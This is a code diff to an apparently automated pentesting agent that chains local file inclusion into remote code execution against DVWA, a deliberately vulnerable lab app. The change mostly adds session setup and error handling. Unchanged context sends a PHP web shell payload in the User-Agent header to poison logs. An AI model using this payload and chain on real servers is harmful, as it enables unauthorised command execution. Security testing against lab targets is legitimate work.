@@ -6,8 +6,14 @@ from typing import Any
 import re
 
 from agents.base_agent import BaseAgent
-from agents.state_utils import make_update
+from agents.state_utils import (
+    append_error_marker,
+    make_update,
+    normalize_security_level,
+    prepare_agent_session,
+)
 from core.state import ExploitationState
+from foundation.http_client import RequestTimeoutError, TransportError
 from foundation.session_manager import DVWASession
 
 
@@ -33,6 +39,7 @@ class LFIToRCEChainAgent(BaseAgent):
             )
 
         target_url = state.get("target_url", "")
+        level = normalize_security_level(state.get("security_level"))
         if not target_url:
             return make_update(
                 state=state,
@@ -43,6 +50,16 @@ class LFIToRCEChainAgent(BaseAgent):
 
         session = DVWASession(target_url)
         try:
+            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
+            tried_now.extend(prep_notes)
+            if not ready:
+                return make_update(
+                    state=state,
+                    module_name=self.module_name,
+                    score=score,
+                    tried_payloads=tried_now,
+                )
+
             poison_payload = "<?php system($_GET['cmd']); ?>"
             session.http.get("index.php", headers={"User-Agent": poison_payload})
             tried_now.append("log_poison")
@@ -59,8 +76,8 @@ class LFIToRCEChainAgent(BaseAgent):
                 score = 4
                 confirmed = ["rce_achieved"]
                 outcomes = ["rce_achieved"]
-        except Exception:
-            pass
+        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
+            append_error_marker(tried_now, "lfi_chain_runtime_error", exc)
         finally:
             session.close()
 
